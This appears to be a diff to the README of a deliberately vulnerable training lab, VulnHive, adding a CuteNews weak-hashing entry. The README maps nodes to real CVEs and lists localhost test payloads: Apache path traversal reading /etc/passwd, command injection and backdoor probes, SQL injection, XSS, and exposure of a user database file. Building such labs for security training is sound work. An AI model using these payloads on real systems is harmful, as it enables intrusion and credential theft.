@@ -31,6 +31,7 @@ The nodes within VulnHive map directly to critical vulnerabilities identified in
 | VulnHive Node | Vulnerability Type | Real-World Software | OWASP Category |
 | :--- | :--- | :--- | :--- |
 | **LFI / RCE** | Path Traversal | Apache 2.4.49 (CVE-2021-41773) | A01:2021-Broken Access Control |
+| **Cryptographic**| Weak MD5 Hashing | CuteNews 1.4.5 (Searchsploit 4779) | A02:2021-Cryptographic Failures |
 | **SQLi** | SQL Injection | Cuppa CMS v1.0 (CVE-2022-24265) | A03:2021-Injection |
 | **XSS** | Cross-Site Scripting | WonderCMS 3.4.2 (CVE-2023-41425) | A03:2021-Injection |
 | **RCE** | Command Injection | Atom CMS 2.0 (Searchsploit 50840)| A03:2021-Injection |
@@ -69,6 +70,7 @@ To verify your environment is working, you can try the following payloads agains
 *   **LFI (Apache):** `http://127.0.0.1:54321/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd`
 *   **RCE (Atom CMS):** `http://127.0.0.1:54322/index.php?cmd=id`
 *   **SQLi (Cuppa CMS):** `http://127.0.0.1:54323/index.php?id=1'%20OR%201=1`
+*   **Crypto (CuteNews):** `http://127.0.0.1:54330/data/users.db.php`
 *   **XSS (WonderCMS):** `http://127.0.0.1:54324/?xss=<script>alert('VulnHive')</script>`
 *   **PHP Backdoor:** `http://127.0.0.1:54325/?cmd=whoami`
 
